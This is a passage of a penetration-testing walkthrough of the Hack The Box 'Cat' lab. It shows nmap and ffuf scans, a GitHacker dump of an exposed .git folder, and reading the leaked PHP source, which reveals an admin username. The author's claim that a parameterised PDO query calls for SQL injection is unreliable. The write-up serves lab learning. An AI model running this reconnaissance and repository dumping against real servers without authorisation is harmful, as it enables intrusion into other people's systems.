![[Cat.png]]


# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.73.213
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 23:05 CET
Nmap scan report for 10.129.73.213
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds

```

### Detailed port scan

At the gedatialized port scan go to get more information from the services who are open on the ip address.

```
nmap -p22,80 -sCV 10.129.73.213 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 23:06 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
Initiating Ping Scan at 23:06
Scanning 10.129.73.213 [4 ports]
Completed Ping Scan at 23:06, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:06
Completed Parallel DNS resolution of 1 host. at 23:06, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:06
Scanning 10.129.73.213 [2 ports]
Discovered open port 22/tcp on 10.129.73.213
Discovered open port 80/tcp on 10.129.73.213
Completed SYN Stealth Scan at 23:06, 0.07s elapsed (2 total ports)
Initiating Service scan at 23:06
Scanning 2 services on 10.129.73.213
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 23:06 (0:00:06 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 23:06 (0:00:00 remaining)
Completed Service scan at 23:06, 6.10s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.73.213.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:06
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 6 (1 waiting)
NSE Timing: About 97.91% done; ETC: 23:06 (0:00:00 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 4 (0 waiting)
NSE Timing: About 98.61% done; ETC: 23:06 (0:00:00 remaining)
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 1 (1 waiting)
NSE Timing: About 99.65% done; ETC: 23:06 (0:00:00 remaining)
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 1 (1 waiting)
NSE Timing: About 99.65% done; ETC: 23:06 (0:00:00 remaining)
Completed NSE at 23:06, 1.73s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.29s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
Nmap scan report for 10.129.73.213
Host is up, received echo-reply ttl 63 (0.019s latency).
Scanned at 2025-02-01 23:06:12 CET for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:06
Completed NSE at 23:06, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

I went to the webpage and there we can go and register an account. I will go to create an account using the following information.

![[Pasted image 20250201230936.png]]

as you can see I have now created an account.

![[Pasted image 20250201231023.png]]

I went to look for all the subdirectories that there are, but I can't go to any of them because everything is forbidden.

```
ffuf -u http://cat.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cat.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 2408ms]
img                     [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 17ms]
uploads                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 44ms]
                        [Status: 200, Size: 3075, Words: 870, Lines: 130, Duration: 19ms]
winners                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 17ms]
:: Progress: [30000/30000] :: Job [1/1] :: 1680 req/sec :: Duration: [0:00:20] :: Errors: 2 ::
```

I also started doing the same thing for checking if there are no important files.

```
ffuf -u http://cat.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -ac          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cat.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 3075, Words: 870, Lines: 130, Duration: 2992ms]
admin.php               [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 4985ms]
config.php              [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 47ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
vote.php                [Status: 200, Size: 1242, Words: 319, Lines: 42, Duration: 20ms]
.                       [Status: 200, Size: 3075, Words: 870, Lines: 130, Duration: 25ms]
join.php                [Status: 200, Size: 4004, Words: 997, Lines: 141, Duration: 18ms]
.git                    [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 16ms]
contest.php             [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 24ms]
winners.php             [Status: 200, Size: 5082, Words: 1554, Lines: 197, Duration: 25ms]
:: Progress: [17129/17129] :: Job [1/1] :: 1769 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Now that I know there is a subfolder “.git”, I will try to go and see if there isn't something interesting there. But before we can do that we see above that this one is also forbidden. And as you will see below it is forbidden.

![[Pasted image 20250201234755.png]]

So I started looking for a git-dumper exploit. A **Git-dumper exploit** exploits misconfigured Web servers that accidentally make a project's `.git` folder publicly accessible. This folder contains the entire version history of a Git repository, including source code, configuration files and sometimes sensitive information such as passwords, API keys or server configurations. So in doing so, I found the following exploit via github. "https://github.com/WangYihang/GitHacker". 

So based on this command, I will start looking at the url "http://cat.htb/.git/" and the output found on the .git subfolder will be put in the subdirectory “result” within my own kali machine.

```
githacker --url http://cat.htb/.git/ --output-folder result

2025-02-01 23:44:29 INFO 1 urls to be exploited
2025-02-01 23:44:29 INFO Exploiting http://cat.htb/.git/ into result/cbd584a870bc23c228bfffe42f75330d
2025-02-01 23:44:30 INFO Downloading basic files...
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/FETCH_HEAD
2025-02-01 23:44:30 INFO [23 bytes] 200 .git/HEAD
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 INFO [7 bytes] 200 .git/COMMIT_EDITMSG
2025-02-01 23:44:30 INFO [73 bytes] 200 .git/description
2025-02-01 23:44:30 INFO [240 bytes] 200 .git/info/exclude
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 INFO [1726 bytes] 200 .git/index
2025-02-01 23:44:30 INFO [150 bytes] 200 .git/logs/HEAD
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/HEAD
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/logs/refs/stash
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/ORIG_HEAD
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/packed-refs
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/refs/remotes/origin/HEAD
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/refs/stash
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/objects/info/alternates
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/objects/info/packs
2025-02-01 23:44:30 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/objects/info/http-alternates
2025-02-01 23:44:30 ERROR [269 bytes] 404 .git/refs/tags/v0.0.1
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/tags/0.0.1
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/tags/v1.0.0
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/tags/1.0.0
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/daily
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/dev
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/feature
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/feat
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/fix
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/hotfix
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/main
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/issue
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 INFO [150 bytes] 200 .git/logs/refs/heads/master
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/ng
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/quickfix
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/release
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/test
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/testing
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/daily
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/heads/wip
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/dev
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/feature
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/fix
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/feat
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/hotfix
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/issue
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/main
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/master
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/ng
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/quickfix
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/release
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/test
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/testing
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/wip
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/logs/refs/remotes/origin/master
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/remotes/origin/daily
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/remotes/origin/dev
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/remotes/origin/feature
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/remotes/origin/feat
2025-02-01 23:44:31 ERROR [269 bytes] 404 .git/refs/remotes/origin/fix
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/hotfix
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/issue
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/main
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/master
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/ng
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/quickfix
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/release
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/test
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/testing
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/wip
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/daily
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/remotes/origin/master
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/dev
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/feature
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/fix
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/feat
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/hotfix
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/issue
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/main
2025-02-01 23:44:32 INFO [41 bytes] 200 .git/refs/heads/master
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/ng
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/quickfix
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/release
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/test
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/testing
2025-02-01 23:44:32 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:32 ERROR [269 bytes] 404 .git/refs/heads/wip
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/applypatch-msg is potential dangerous, skip downloading this file                                                                         
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/applypatch-msg
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/config is potential dangerous, skip downloading this file                                                                                       
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/config
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/commit-msg is potential dangerous, skip downloading this file                                                                             
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/commit-msg
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/fsmonitor-watchman is potential dangerous, skip downloading this file                                                                     
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/fsmonitor-watchman
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/post-update is potential dangerous, skip downloading this file                                                                            
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/pre-applypatch is potential dangerous, skip downloading this file                                                                         
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/post-update
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/pre-applypatch
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/pre-commit is potential dangerous, skip downloading this file                                                                             
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/pre-commit
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/pre-merge-commit is potential dangerous, skip downloading this file                                                                       
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/pre-merge-commit
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/pre-rebase is potential dangerous, skip downloading this file                                                                             
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/pre-rebase
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/pre-push is potential dangerous, skip downloading this file                                                                               
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/pre-push
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/pre-receive is potential dangerous, skip downloading this file                                                                            
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/pre-receive
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/prepare-commit-msg is potential dangerous, skip downloading this file                                                                     
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/prepare-commit-msg
2025-02-01 23:44:32 ERROR /tmp/tmpr_r5as8y/.git/hooks/update is potential dangerous, skip downloading this file                                                                                 
2025-02-01 23:44:32 ERROR [-1 bytes] -1 .git/hooks/update
2025-02-01 23:44:32 INFO Downloading head files...
2025-02-01 23:44:33 INFO [121 bytes] 200 .git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
2025-02-01 23:44:33 INFO Downloading blob files...
2025-02-01 23:44:33 INFO [2326 bytes] 200 .git/objects/0c/be0133fb00b13165bd7318e42e17f322daac7f
2025-02-01 23:44:33 INFO [1591 bytes] 200 .git/objects/64/d98c5af736de120e17eff23b17e22aad668718
2025-02-01 23:44:33 INFO [225 bytes] 200 .git/objects/31/e87489c5f8160f895e941d00087bea94f21315
2025-02-01 23:44:33 INFO [477 bytes] 200 .git/objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
2025-02-01 23:44:33 INFO [897 bytes] 200 .git/objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8
2025-02-01 23:44:33 INFO [536 bytes] 200 .git/objects/91/92afa265e9e73f533227e4f118f882615d3640
2025-02-01 23:44:33 INFO [73372 bytes] 200 .git/objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
2025-02-01 23:44:33 INFO [29707 bytes] 200 .git/objects/9b/e1a76f22449a7876a712d34dc092f477169c36
2025-02-01 23:44:33 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:33 INFO [73372 bytes] 200 .git/objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
2025-02-01 23:44:33 INFO [243227 bytes] 200 .git/objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
2025-02-01 23:44:33 INFO [1298 bytes] 200 .git/objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028
2025-02-01 23:44:33 INFO [2008 bytes] 200 .git/objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5
2025-02-01 23:44:33 INFO [79 bytes] 200 .git/objects/38/660821153b31dbbee89396eacf974c095ab0dc
2025-02-01 23:44:33 INFO [1175 bytes] 200 .git/objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4
2025-02-01 23:44:33 ERROR FileExistsError(17, 'File exists')
2025-02-01 23:44:33 INFO [243227 bytes] 200 .git/objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
2025-02-01 23:44:33 INFO [659 bytes] 200 .git/objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2
2025-02-01 23:44:33 INFO [1228 bytes] 200 .git/objects/88/12266cb97013f416c175f9a9fa08aae524c92a
2025-02-01 23:44:33 INFO [775 bytes] 200 .git/objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5
2025-02-01 23:44:33 INFO Running git fsck files...
2025-02-01 23:44:33 INFO [448 bytes] 200 .git/objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
2025-02-01 23:44:33 INFO [55 bytes] 200 .git/objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc
2025-02-01 23:44:33 INFO [75 bytes] 200 .git/objects/cf/8166a8873d413e6afd88fa03305880e795a2c6
2025-02-01 23:44:33 INFO [113 bytes] 200 .git/objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222
2025-02-01 23:44:33 INFO Cloning downloaded repo from /tmp/tmpr_r5as8y to result/cbd584a870bc23c228bfffe42f75330d
2025-02-01 23:44:34 ERROR Cloning into 'result/cbd584a870bc23c228bfffe42f75330d'...
done.                                                                                           
2025-02-01 23:44:34 INFO Check it out: result/cbd584a870bc23c228bfffe42f75330d
2025-02-01 23:44:34 INFO 1 / 1 were exploited successfully
2025-02-01 23:44:34 INFO http://cat.htb/.git/ -> result/cbd584a870bc23c228bfffe42f75330d
```

Now if I will go and look in the folder where all the data of the .git subfolder is stored, we will see following different files.

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ ls
accept_cat.php  contest.php     img          join.php      vote.php
admin.php       css             img_winners  logout.php    winners
config.php      delete_cat.php  index.php    view_cat.php  winners.php
```

We see that there is an admin.php file in there. I went to see what is in this file and what it contains. In this file I saw a username that I think could be the admin user.

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ cat admin.php                   
<?php
session_start();

include 'config.php';

// Check if the user is logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}

// Fetch cat data from the database
$stmt = $pdo->prepare("SELECT * FROM cats");
$stmt->execute();
$cats = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
```

From this information, we see that we will have to do a sql injection for provding the information we need to have to provide a ssh connection.

```
if ($cat_id) {
    // Prepare and execute the query
    $query = "SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id";
    $statement = $pdo->prepare($query);
    $statement->bindParam(':cat_id', $cat_id, PDO::PARAM_INT);
    $statement->execute();

```

Within the config.php file, I found the full cats database. 

